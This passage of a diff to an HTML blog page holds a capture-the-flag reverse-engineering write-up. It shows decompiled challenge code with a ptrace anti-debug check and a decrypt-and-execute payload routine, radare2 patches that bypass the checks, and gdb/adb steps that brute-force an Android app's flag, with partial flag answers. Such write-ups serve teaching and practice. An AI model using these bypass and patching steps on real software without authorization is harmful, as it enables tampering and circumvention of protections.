+  &lt;span class=&quot;n&quot;&gt;lVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptrace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PTRACE_TRACEME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;local_15c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;lVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptrace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PTRACE_TRACEME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;local_15c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_15c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_15c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;RC4_set_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RC4_KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_118&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;RC4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RC4_KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_118&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;runPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Press any key to quit...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tcgetattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_158&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;local_158&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_lflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_158&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_lflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfffffffd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;local_158&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_cc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\x01'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;local_158&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_cc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tcsetattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_158&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;getchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONCAT44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extraout_var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;cm&quot;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;__stack_chk_fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RC4_set_key((RC4_KEY *)local_118,0x32,key);&lt;/code&gt; was getting the key for RC4.
@@ -315,22 +333,22 @@ I used Ghidra to decompile the file. After opening the file with Ghidra and deco
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runPayload();&lt;/code&gt; has the following code.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void runPayload(void)
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;runPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-{
-  undefined8 *puVar1;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
-  puVar1 = (undefined8 *)rwxmalloc(0x100);
-  unpackPayload(puVar1);
-  (*(code *)puVar1)(); 
-  return;
-}
+  &lt;span class=&quot;n&quot;&gt;puVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rwxmalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;unpackPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt; 
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Line &lt;code class=&quot;highlighter-rouge&quot;&gt;(*(code *)puVar1)();&lt;/code&gt; looks strange. Here it is calling some method, so lets check what it is calling.&lt;/p&gt;
 
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lVar2 = ptrace(PTRACE_TRACEME,0,1,0);&lt;/code&gt; of main function checking if debugger is attached or not.
 So, Running the file with the debugger attached will delete the file. For this, we have to patch the file. I did it using &lt;code class=&quot;highlighter-rouge&quot;&gt;radare2&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 -w ./anti_what
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ./anti_what
 s 0x158f // Address on which we want to change the instruction
 wa jmp 0x15a8 //change je to jmp
 quit 
@@ -342,16 +360,17 @@ quit
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_4.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Now,&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb ./anti_what
-break runPayload // to check what's going on runPayload
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb ./anti_what
+&lt;span class=&quot;nb&quot;&gt;break &lt;/span&gt;runPayload &lt;span class=&quot;c&quot;&gt;# to check what's going on runPayload&lt;/span&gt;
 r
 disas
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Set breakpoint after line “call *%rdx”. In my case it is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000555555555554f1&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;break *0x0000555555555554f1
-x/s $rdx
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x0000555555555554f1
+c
+x/s &lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -384,10 +403,10 @@ I used Ghidra to decompile the file. Code looked like this&lt;/p&gt;
 
 &lt;p&gt;Address 0x00401063 contains &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSCALL&lt;/code&gt; (looks interesting).
 I patch the file by changing program to jmp at 0x0040101a so that SYSCALL get executed.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 -w ./ghidra_is_cool
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ./ghidra_is_cool
 s 0x401000
 wa jmp 0x0040101a
-exit
+&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Check the changes are made using
 &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -D -M intel -j .text ghidra_is_cool&lt;/code&gt;&lt;/p&gt;
@@ -425,12 +444,13 @@ meggenser.tar.gz
 
 &lt;p&gt;So, I just bruteforce the flag by holding the if condition.&lt;/p&gt;
 
-&lt;p&gt;In function &lt;code class=&quot;highlighter-rouge&quot;&gt;Java_com_facebook_bountycon2020_app_Emojifier_parse&lt;/code&gt;. There is one if condition like below&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (((cVar3 != '-') &amp;amp;&amp;amp;
-  (((local_3c = (char *)0xffffffa0, 0x19 &amp;lt; (byte)(cVar3 + 0x9fU) &amp;amp;&amp;amp;
-    (local_3c = (char *)0xffffffeb, 9 &amp;lt; (byte)(cVar3 - 0x30U))) ||
-   (pcVar7 = local_3c + cVar3, pcVar7 == (char *)0xffffffff)))) ||
- (piVar11 = (int *)piVar11[(int)(pcVar7 + 1)], piVar11 == (int *)0x0)) goto LAB_00010c33;
+&lt;p&gt;In function 
+&lt;code class=&quot;highlighter-rouge&quot;&gt;Java_com_facebook_bountycon2020_app_Emojifier_parse&lt;/code&gt;. There is one if condition like below&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'-'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_3c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffa0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9fU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_3c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffeb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30U&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcVar7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_3c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cVar3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcVar7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;piVar11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;piVar11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcVar7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;piVar11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LAB_00010c33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Whatever you enter the right character of the flag. Above if the condition will be true.&lt;/p&gt;
@@ -439,30 +459,30 @@ meggenser.tar.gz
 
 &lt;p&gt;Connect meggenser app to gdb to debug it.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb connect 192.168.145.101:5555 # Enter your emulator ip and port
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb connect 192.168.145.101:5555 &lt;span class=&quot;c&quot;&gt;# Enter your emulator ip and port&lt;/span&gt;
 adb forward tcp:44444 tcp:44444
 adb shell am start com.facebook.bountycon2020.app/com.facebook.bountycon2020.app.MainActivity
-adb shell su root 'gdbserver --attach :44444 `pidof com.facebook.bountycon2020.app`'
-#Run GDB.
-gdb -ex 'target remote :44444'
-break Java_com_facebook_bountycon2020_app_Emojifier_parse
+adb shell su root &lt;span class=&quot;s1&quot;&gt;'gdbserver --attach :44444 `pidof com.facebook.bountycon2020.app`'&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Run GDB.&lt;/span&gt;
+gdb &lt;span class=&quot;nt&quot;&gt;-ex&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'target remote :44444'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;break &lt;/span&gt;Java_com_facebook_bountycon2020_app_Emojifier_parse
 c
-# Enter any input from app.
+&lt;span class=&quot;c&quot;&gt;# Enter any input from app.&lt;/span&gt;
 disas
-#Place breakpoint anywhere in the if condition. In my case, it is address 0xe39alccf
-break *0xe39alccf
-del 1 # To delete the first breakpoint.
-# Enter :bountycon-a: as flag for this challenge starts with bountycon-...
-c 10 # length of &quot;bountycon-&quot; is 10 if message prints on the app then it is a wrong guess.
-# Enter :bountycon-3:
-c 10 # gdb will be on breakpoint under the if condition as input is correct so &quot;3&quot; is the right input for the the flag.
+&lt;span class=&quot;c&quot;&gt;#Place breakpoint anywhere in the if condition. In my case, it is address 0xe39alccf&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0xe39alccf
+del 1 &lt;span class=&quot;c&quot;&gt;# To delete the first breakpoint.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Enter :bountycon-a: as flag for this challenge starts with bountycon-...&lt;/span&gt;
+c 10 &lt;span class=&quot;c&quot;&gt;# length of &quot;bountycon-&quot; is 10 if message prints on the app then it is a wrong guess.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Enter :bountycon-3:&lt;/span&gt;
+c 10 &lt;span class=&quot;c&quot;&gt;# gdb will be on breakpoint under the if condition as input is correct so &quot;3&quot; is the right input for the the flag.&lt;/span&gt;
 c
-# Enter :bountycon-3a: as flag for this challenge starts with bountycon-...
-c 11 # length of &quot;bountycon-3&quot; is 11 if message prints on the app then it is a wrong guess.
-# Enter :bountycon-3m:
-c 11 # gdb will be on breakpoint under the if condition as input is correct
+&lt;span class=&quot;c&quot;&gt;# Enter :bountycon-3a: as flag for this challenge starts with bountycon-...&lt;/span&gt;
+c 11 &lt;span class=&quot;c&quot;&gt;# length of &quot;bountycon-3&quot; is 11 if message prints on the app then it is a wrong guess.&lt;/span&gt;
